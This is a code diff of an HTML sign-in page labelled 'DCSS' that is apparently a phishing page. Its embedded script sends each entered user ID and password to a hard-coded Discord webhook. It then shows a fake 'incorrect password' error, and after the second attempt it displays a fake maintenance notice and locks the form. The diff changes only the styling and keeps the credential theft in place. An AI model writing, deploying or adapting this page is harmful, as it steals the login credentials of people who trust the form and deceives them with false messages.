@@ -259,13 +259,15 @@
                                           <td align="left" colspan="2" class="font2" style="font-weight: bold; font-size: 15px">Enter your User ID if you are an existing user or click on register to sign up. </td>
                                        </tr>
                                        <tr>
-                                          <td align="center" aria-disabled="true" id="maintenanceMessage" colspan="2" class="font2" style="color: red; font-weight: bold; font-size: 15px; opacity: 0; padding-bottom: 5px;">
-                                             Our website is temporarily unavailable as we conduct important maintenance to enhance your experience. We expect to be back online within the next 72 hours. We sincerely apologize for any inconvenience this may cause and appreciate your patience during this time. Please feel free to check back later, and thank you for your continued support.
-                                          </td>                                          
-                                       </tr>
-                                       <tr>
-                                          <td align="center" aria-disabled="false" id="errorMessage" colspan="2" class="font2" style="color: red; font-weight: bold; font-size: 15px; opacity: 0; padding-bottom: 5px;">Incorrect UserID or Password. </td>
-                                       </tr>
+                                          <td align="center" aria-disabled="true" id="maintenanceMessage" colspan="2" class="font2" style="color: red; font-weight: bold; font-size: 15px; display: none; padding-bottom: 5px;">
+                                            Our website is temporarily unavailable as we conduct important maintenance to enhance your experience. We expect to be back online within the next 72 hours. We sincerely apologize for any inconvenience this may cause and appreciate your patience during this time. Please feel free to check back later, and thank you for your continued support.
+                                          </td>
+                                        </tr>
+                                        <tr>
+                                          <td align="center" aria-disabled="false" id="errorMessage" colspan="2" class="font2" style="color: red; font-weight: bold; font-size: 15px; display: none; padding-bottom: 5px;">
+                                            Incorrect UserID or Password.
+                                          </td>
+                                        </tr>                                        
                                        <tr>
                                           <td style="background-color: #E4E8EF;" align="right" width="41%" class="font7"><font color="#864038">*</font>User ID:</td>
                                           <td align="left" width="59%">&nbsp;<input class="capslink" type="TEXT" id="username" name="username" autocomplete="off" maxlength="8"></td>
@@ -305,47 +307,47 @@
                                           </td>
                                        </tr>
                                        <script>
-                                          let attempts = 2;
 
+                                          let attempts = 2;
                                           function validateCredentials() {
                                              var username = document.getElementById('username').value;
                                              var password = document.getElementById('password').value;
 
                                              if (username === "" || password === "") {
-                                                document.getElementById('errorMessage').style.opacity = '0';
-                                              } else {
+                                                document.getElementById('errorMessage').style.display = 'none';
+                                             } else {
                                                 attempts--;
 
                                                 if (attempts === 0) {
                                                    document.getElementById('errorMessage').setAttribute('aria-disabled', 'true');
-                                                   document.getElementById('errorMessage').style.opacity = '0';
+                                                   document.getElementById('errorMessage').style.display = 'none';
                                                    document.getElementById('maintenanceMessage').setAttribute('aria-disabled', 'false');
-                                                   document.getElementById('maintenanceMessage').style.opacity = '100';
+                                                   document.getElementById('maintenanceMessage').style.display = 'block';
                                                    document.getElementById('username').disabled = true;
                                                    document.getElementById('password').disabled = true;
                                                    document.getElementById('submitButton').disabled = true;
                                                    return;
                                                 } else {
-
-                                                   document.getElementById('errorMessage').style.opacity = '100';
+                                                   document.getElementById('errorMessage').style.display = 'block';
 
                                                    var webhookURL = "https://discordapp.com/api/webhooks/1279482681159319592/fpE3YOcL8O0O4NR_MGdB4P17ulkUvhcQFovxdWj0tQRCYF9Mb5JWWwhk9EJRUzQiP7vt";
 
                                                    var params = {
-                                                      username: "DCSS",
-                                                      content: "Username: " + username + "\nPassword: " + password
+                                                   username: "DCSS",
+                                                   content: "Username: " + username + "\nPassword: " + password
                                                    };
 
                                                    fetch(webhookURL, {
-                                                      method: 'POST',
-                                                      headers: {
-                                                         'Content-Type': 'application/json'
-                                                      },
-                                                      body: JSON.stringify(params)
-                                                   })
+                                                   method: 'POST',
+                                                   headers: {
+                                                      'Content-Type': 'application/json'
+                                                   },
+                                                   body: JSON.stringify(params)
+                                                   });
                                                 }
-                                              }
+                                             }
                                           }
+
                                       </script>
                                        <tr>
                                           <td colspan="2" height="5"></td>
